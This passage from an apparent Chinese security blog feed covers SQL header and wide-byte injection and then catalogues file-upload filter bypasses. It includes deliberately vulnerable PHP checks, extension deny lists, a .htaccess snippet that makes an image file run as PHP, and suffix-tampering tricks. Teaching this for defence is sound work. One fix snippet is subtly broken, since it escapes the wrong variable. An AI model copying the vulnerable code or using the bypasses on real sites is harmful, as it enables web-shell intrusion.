<span class="comment">//设置一个cookie 键值、键名</span></span><br><span class="line"></span><br><span class="line">$cookie = $_COOKIE[<span class="string">'values'</span>]; <span class="comment">// 获取请求中的Cookie信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"COOKIE:"</span>.$cookie.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$xff = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>); <span class="comment">// 获取XFF请求的数据信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xff;</span><br><span class="line"></span><br><span class="line">$UA = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]; <span class="comment">//获取请求中的User-Agent</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $UA.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$host = $_SERVER[<span class="string">"HTTP_HOST"</span>]; <span class="comment">// 获取请求中的Host</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $host.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"insert into db values('$cookie','$host','$UA')"</span>;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,$sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cookie = $_COOKIE[<span class="string">'values'</span>]; <span class="comment">// 获取请求中的Cookie信息</span></span><br><span class="line"></span><br><span class="line">$cookie = addslashes($cookie);<span class="comment">//将数据内容进行转义</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$UA = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]; <span class="comment">//获取请求中的User-Agent</span></span><br><span class="line"></span><br><span class="line">$UA = addslashes($UA);<span class="comment">//将数据内容进行转义</span></span><br><span class="line"></span><br><span class="line">$xff = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>); <span class="comment">//获取请求中的XFF</span></span><br><span class="line"></span><br><span class="line">$xff = addslashes($xss) <span class="comment">//将数据内容进行转义</span></span><br><span class="line"></span><br><span class="line">$host = $_SERVER[<span class="string">"HTTP_HOST"</span>]; <span class="comment">// 获取请求中的Host</span></span><br><span class="line"></span><br><span class="line">$host = addslashes($host);<span class="comment">//将数据内容进行转义</span></span><br></pre></td></tr></table></figure><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="什么是宽字节注入"><a href="#什么是宽字节注入" class="headerlink" title="什么是宽字节注入"></a>什么是宽字节注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一个gbk汉字占用两个字节，一个utf-8汉字占用三个字节。</span><br><span class="line">宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</span><br><span class="line">PHP把&apos;转义为\&apos;</span><br><span class="line">mysql 将%df\&apos; 中的%df\ 认为是一个GBK字符，所谓的吃掉了\ 导致sql注入</span><br></pre></td></tr></table></figure><h4 id="宽字节编码的种类"><a href="#宽字节编码的种类" class="headerlink" title="宽字节编码的种类"></a>宽字节编码的种类</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GB2312、GBK、GB18030、BIG5、Shift_JIS等</span><br></pre></td></tr></table></figure><h4 id="MySQL中用于转义的函数"><a href="#MySQL中用于转义的函数" class="headerlink" title="MySQL中用于转义的函数"></a>MySQL中用于转义的函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addslashes</span><br><span class="line">mysql_real_escape_string</span><br><span class="line">mysql_escape_string</span><br><span class="line">以及后面在高版本被去除的magic_quote_gpc</span><br></pre></td></tr></table></figure><h4 id="后端代码-2"><a href="#后端代码-2" class="headerlink" title="后端代码"></a>后端代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$con = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,****,<span class="string">'testt'</span>);</span><br><span class="line"></span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">mysqli_query($con,<span class="string">"set names gbk"</span>); <span class="comment">//设置字符编码为GBK</span></span><br><span class="line"></span><br><span class="line">$id = addslashes($id); <span class="comment">//将获取id的数据进行转义</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from test where id='$id'"</span>;</span><br><span class="line"></span><br><span class="line">$res = mysqli_query($con,$sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysqli_error());</span><br><span class="line"></span><br><span class="line">$row = mysqli_fetch_array($res);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $row[<span class="string">'user'</span>].$ row[<span class="string">'id'</span>].$row[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.设置character_set_client=binary，将数据以二进制形式传递</span><br><span class="line">    mysql客户端查看当前字符集</span><br><span class="line">    show variables like &quot;%char%&quot;;</span><br><span class="line">    在安装MySQL时可以设置服务器的默认编码格式，也可对my.ini做修改，修改[mysqld]里面的 character_set_server=utf8，则可设置character_set_server的值。</span><br><span class="line"></span><br><span class="line">2.矫正人们对于mysql_real_escape_string的误解，单独调用set names gbk和mysql_real_escape_string是无法避免宽   字符注入问题的。还得调用mysql_set_charset来设置一下字符集。</span><br><span class="line"></span><br><span class="line">3.谨慎使用iconv来转换字符串编码，很容易出现问题。只要我们把前端html/js/css所有编码设置成gbk，mysql/php编码设置成gbk，就不会出现乱码问题。不用画蛇添足地去调用iconv转换编码，造成不必要的麻烦。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数据库注入漏洞类型整理&quot;&gt;&lt;a href=&quot;#数据库注入漏洞类型整理&quot; class=&quot;headerlink&quot; title=&quot;数据库注入漏洞类型整理&quot;&gt;&lt;/a&gt;数据库注入漏洞类型整理&lt;/h1&gt;&lt;h2 id=&quot;写在开始&quot;&gt;&lt;a href=&quot;#写在开始&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="数据库安全" scheme="https://13l00m.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="https://13l00m.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="mysql" scheme="https://13l00m.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞类型总结</title>
    <link href="https://13l00m.github.io/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/"/>
    <id>https://13l00m.github.io/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</id>
    <published>2019-11-28T01:37:38.000Z</published>
    <updated>2019-11-28T01:55:57.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞类型总结"><a href="#文件上传漏洞类型总结" class="headerlink" title="文件上传漏洞类型总结"></a>文件上传漏洞类型总结</h1><h2 id="写在开始"><a href="#写在开始" class="headerlink" title="写在开始"></a>写在开始</h2><ul><li>文件上传不同类型有难易之分，简单类型简单处理</li></ul><h2 id="文件上传——前端绕过"><a href="#文件上传——前端绕过" class="headerlink" title="文件上传——前端绕过"></a>文件上传——前端绕过</h2><ul><li>前端代码</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="actionscript">            alert(<span class="string">"请选择要上传的文件!"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">//定义允许上传的文件类型</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//提取上传文件的类型</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//判断上传文件类型是否允许上传</span></span></span><br><span class="line">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span></span><br><span class="line">            alert(errMsg);</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>检测程序为前端校验</li></ul><p>绕过方法：</p><ul><li>删除JavaScript代码</li><li>上传图片马，burp抓包将后缀改为原脚本后缀类型</li></ul><h2 id="文件上传——文件类型绕过"><a href="#文件上传——文件类型绕过" class="headerlink" title="文件上传——文件类型绕过"></a>文件上传——文件类型绕过</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];          </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>程序只检测了上传文件的文件类型</li></ul><p>绕过方法：</p><ul><li>上传图片改文件后缀</li><li>上传脚本文件，改文件类型</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/文件类型绕过/1.gif" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/文件类型绕过/2.gif" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="文件上传——不同脚本文件类型解析绕过"><a href="#文件上传——不同脚本文件类型解析绕过" class="headerlink" title="文件上传——不同脚本文件类型解析绕过"></a>文件上传——不同脚本文件类型解析绕过</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">    $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">    $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">    $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">    $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">    $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>程序未对可以解析php文件的其他类型进行过滤</li><li>服务器支持未进行过滤的其他文件类型进行解析php</li></ul><p>绕过方法：</p><ul><li>上传能够解析的php文件后缀：phtml、php5 等</li></ul><p>服务器开启phtml，php5解析</p><ul><li>打开配置文件 httpd.conf 添加语句 AddType application/x-httpd-php .php .phtml .phps .php5 .pht（如果存在，将前面的注释删除）</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/不同脚本文件类型解析/1.gif" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="文件上传——-htaccess文件上传绕过"><a href="#文件上传——-htaccess文件上传绕过" class="headerlink" title="文件上传——.htaccess文件上传绕过"></a>文件上传——.htaccess文件上传绕过</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li><strong>.htaccess是什么</strong> <ul><li>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 </li></ul></li></ul><p><a href="https://blog.csdn.net/cmzhuang/article/details/53537591" target="_blank" rel="noopener">htaccess详解及.htaccess参数说明</a></p><p>.htaccess 文件的简单编写</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "<span class="attr">php.png</span>"&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面简单的代码是服务器里面的 php.png 特定文件内容解析为php</p><p>绕过原理：</p><ul><li>程序未对.htaccess 黑名单过滤且上传文件的文件名不会发生改变</li></ul><p>绕过方法：</p><ul><li>编写并上传.htaccess 文件 利用其特性可将文件类型定将解析为脚本类型</li></ul><h2 id="文件上传——文件类型大小写绕过"><a href="#文件上传——文件类型大小写绕过" class="headerlink" title="文件上传——文件类型大小写绕过"></a>文件上传——文件类型大小写绕过</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>程序没有将上传文件名进行统一大小写处理</li></ul><p>绕过方法：</p><ul><li>文件类型后缀大小写处理后进行上传</li></ul><p>注意事项：</p><ul><li>Linux系统的文件名是区分大小写的，所以该上传方法不适用于Linux服务器</li></ul><h2 id="文件上传——后缀名加空格绕过"><a href="#文件上传——后缀名加空格绕过" class="headerlink" title="文件上传——后缀名加空格绕过"></a>文件上传——后缀名加空格绕过</h2><p>后端代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>程序没有对文件后缀名去空处理</li></ul><p>绕过方法</p><ul><li>文件上传burp抓包修改后缀加个空格</li></ul><h2 id="文件上传——后缀名加-绕过"><a href="#文件上传——后缀名加-绕过" class="headerlink" title="文件上传——后缀名加 . 绕过"></a>文件上传——后缀名加 . 绕过</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span 